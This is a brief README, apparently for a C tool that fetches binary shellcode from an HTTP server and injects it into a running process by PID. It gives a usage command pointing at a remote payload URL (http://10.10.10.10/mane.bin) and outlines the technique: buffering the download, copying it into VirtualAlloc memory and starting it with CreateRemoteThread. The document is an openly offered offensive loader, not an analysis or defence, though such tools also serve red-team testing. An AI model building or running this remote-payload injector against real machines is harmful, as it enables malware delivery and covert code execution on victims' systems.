# Load From HTTP with C

Inject shell code from HTTP server, Using C Programming Language.

Usage: `InjectFromHTTPWithC.exe PID <http://10.10.10.10/mane.bin>`

## Technical

Send a HTTP Request, receive binary shellcode, bit by bit copy into buffer.

When receive finish, copy buffer into `VirtualAlloc` and using `CreateRemoteThread` to inject process.
